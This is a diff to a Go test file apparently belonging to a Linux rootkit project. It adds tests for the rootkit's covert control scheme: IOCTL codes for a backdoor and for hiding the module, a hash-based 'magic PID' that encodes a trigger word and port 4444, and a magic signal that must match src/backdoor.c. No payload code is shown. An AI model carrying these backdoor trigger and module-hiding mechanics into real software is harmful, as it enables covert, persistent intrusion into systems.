@@ -27,6 +27,7 @@ func TestIOCTLConstants(t *testing.T) {
 		{"BACKDOOR_MAGIC", IOCTL_BACKDOOR_MAGIC, 0x4010C00C},
 		{"MODULE_HIDE", IOCTL_MODULE_HIDE, 0xC00D},
 		{"MODULE_UNHIDE", IOCTL_MODULE_UNHIDE, 0xC00E},
+		{"GET_STATS", IOCTL_GET_STATS, 0x9000C00F},
 	}
 
 	for _, tt := range tests {
@@ -113,5 +114,46 @@ func TestPointerSafety(t *testing.T) {
 	ptr := unsafe.Pointer(&buf[0])
 	if ptr == nil {
 		t.Error("valid pointer unexpectedly nil")
+	}
+}
+
+func TestFNV1a16(t *testing.T) {
+	// Reference values computed independently with the same
+	// FNV-1a 32-bit + fold algorithm used in src/backdoor.c.
+	cases := []struct {
+		in   string
+		want uint16
+	}{
+		{"", 0x1CD9},
+		{"a", 0xCD20},
+		{"foobar", 0x46F4},
+		{"pwn", 0xBCBF},
+		{"hello world", 0xEA2C},
+	}
+	for _, c := range cases {
+		if got := FNV1a16(c.in); got != c.want {
+			t.Errorf("FNV1a16(%q) = 0x%04X, want 0x%04X", c.in, got, c.want)
+		}
+	}
+}
+
+func TestMagicPID(t *testing.T) {
+	got := MagicPID("pwn", 4444)
+	want := uint32(4444)<<16 | uint32(FNV1a16("pwn"))
+	if got != want {
+		t.Errorf("MagicPID = %d, want %d", got, want)
+	}
+	if MagicPID("pwn", 4444)>>16 != 4444 {
+		t.Errorf("MagicPID upper 16 bits must carry the port")
+	}
+	if MagicPID("pwn", 4444)&0xFFFF != uint32(FNV1a16("pwn")) {
+		t.Errorf("MagicPID lower 16 bits must carry the word hash")
+	}
+}
+
+func TestMagicSignal(t *testing.T) {
+	// Must match MAGIC_SIGNAL in src/backdoor.c (glibc SIGRTMIN+1)
+	if MagicSignal != 35 {
+		t.Errorf("MagicSignal = %d, want 35 (glibc SIGRTMIN+1)", MagicSignal)
 	}
 }
